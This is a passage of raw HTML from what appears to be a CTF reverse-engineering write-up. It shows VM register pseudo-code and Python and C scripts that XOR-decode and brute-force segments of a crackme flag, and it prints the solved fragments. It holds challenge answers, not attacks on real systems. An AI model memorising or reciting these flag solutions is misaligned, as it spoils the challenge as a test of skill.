class="line">reg2= 5</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 7</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 2565961507</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 904182048</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 18</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">cmp reg1=1877735783</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[36]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[37]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[38]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[39]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 3474130140, reg1</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[40]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[41]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[42]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[43]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 674991748, reg1</span><br><span class="line">jne exit</span><br></pre></td></tr></table></figure><p>前面异或直接给ai破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line">s = [<span class="literal">None</span>] * <span class="number">32</span>  <span class="comment"># 创建一个长度为 32 的列表来存储 s 的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于每个 i，x 和 y 的值</span></span><br><span class="line"><span class="keyword">for</span> i, x, y <span class="keyword">in</span> [</span><br><span class="line">    (<span class="number">0</span>, fog[<span class="number">0</span>], <span class="number">74</span>), </span><br><span class="line">    (<span class="number">1</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">2</span>, fog[<span class="number">3</span>], <span class="number">221</span>), </span><br><span class="line">    (<span class="number">3</span>, fog[<span class="number">2</span>], <span class="number">15</span>), </span><br><span class="line">    (<span class="number">4</span>, fog[<span class="number">1</span>], <span class="number">27</span>), </span><br><span class="line">    (<span class="number">5</span>, fog[<span class="number">3</span>], <span class="number">137</span>), </span><br><span class="line">    (<span class="number">6</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">7</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">8</span>, fog[<span class="number">0</span>], <span class="number">79</span>), </span><br><span class="line">    (<span class="number">9</span>, fog[<span class="number">0</span>], <span class="number">78</span>), </span><br><span class="line">    (<span class="number">10</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">11</span>, fog[<span class="number">2</span>], <span class="number">86</span>), </span><br><span class="line">    (<span class="number">12</span>, fog[<span class="number">3</span>], <span class="number">142</span>), </span><br><span class="line">    (<span class="number">13</span>, fog[<span class="number">1</span>], <span class="number">73</span>), </span><br><span class="line">    (<span class="number">14</span>, fog[<span class="number">2</span>], <span class="number">14</span>), </span><br><span class="line">    (<span class="number">15</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">16</span>, fog[<span class="number">2</span>], <span class="number">6</span>), </span><br><span class="line">    (<span class="number">17</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">18</span>, fog[<span class="number">1</span>], <span class="number">26</span>), </span><br><span class="line">    (<span class="number">19</span>, fog[<span class="number">0</span>], <span class="number">66</span>), </span><br><span class="line">    (<span class="number">20</span>, fog[<span class="number">2</span>], <span class="number">83</span>), </span><br><span class="line">    (<span class="number">21</span>, fog[<span class="number">0</span>], <span class="number">31</span>), </span><br><span class="line">    (<span class="number">22</span>, fog[<span class="number">2</span>], <span class="number">82</span>), </span><br><span class="line">    (<span class="number">23</span>, fog[<span class="number">3</span>], <span class="number">219</span>), </span><br><span class="line">    (<span class="number">24</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">25</span>, fog[<span class="number">3</span>], <span class="number">217</span>), </span><br><span class="line">    (<span class="number">26</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">27</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">28</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">29</span>, fog[<span class="number">2</span>], <span class="number">0</span>), </span><br><span class="line">    (<span class="number">30</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">31</span>, fog[<span class="number">1</span>], <span class="number">30</span>)</span><br><span class="line">]:  </span><br><span class="line"></span><br><span class="line">    s[i] = <span class="built_in">chr</span>(y ^ x)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#16584abc45baff901c59dde3b1bb6701</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation + <span class="string">&#x27; &#x27;</span></span><br><span class="line">combinations = itertools.product(characters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">对每个组合执行给定的操作</span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> combinations:</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">    reg = [<span class="number">0</span>] * <span class="number">10</span>  </span><br><span class="line">    reg[<span class="number">9</span>] = <span class="built_in">int</span>.from_bytes(s.encode(), <span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 将字符串转换为整数,这里用big，存储就是正序，不然是小端序转换</span></span><br><span class="line"></span><br><span class="line">    reg[<span class="number">1</span>] = reg[<span class="number">9</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">5</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">7</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">2565961507</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">904182048</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">18</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查结果是否等于 1877735783</span></span><br><span class="line">    <span class="keyword">if</span> reg[<span class="number">1</span>] == <span class="number">1877735783</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到了满足条件的字符串：<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># a245</span></span><br></pre></td></tr></table></figure><p>第二部分有与，不可能逆出来，干脆爆破</p><p>后面两次有左移，不好用python，就用c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 所有可能的字符</span></span><br><span class="line"><span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化寄存器</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对每一个组合进行检查</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">s[<span class="number">36</span>] = characters[i];</span><br><span class="line">s[<span class="number">37</span>] = characters[j];</span><br><span class="line">s[<span class="number">38</span>] = characters[k];</span><br><span class="line">s[<span class="number">39</span>] = characters[l];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行给定的操作</span></span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">36</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">37</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">38</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">39</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查结果</span></span><br><span class="line"><span class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">3474130140</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">36</span>], s[<span class="number">37</span>], s[<span class="number">38</span>], s[<span class="number">39</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//b06c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 所有可能的字符</span></span><br><span class="line">    <span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每一个组合进行检查</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line">                    <span class="type">char</span> s[<span class="number">44</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    s[<span class="number">40</span>] = characters[i];</span><br><span class="line">                    s[<span class="number">41</span>] = characters[j];</span><br><span class="line">                    s[<span class="number">42</span>] = characters[k];</span><br><span class="line">                    s[<span class="number">43</span>] = characters[l];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 执行给定的操作</span></span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">40</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">41</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">42</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">43</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 检查结果</span></span><br><span class="line">                    <span 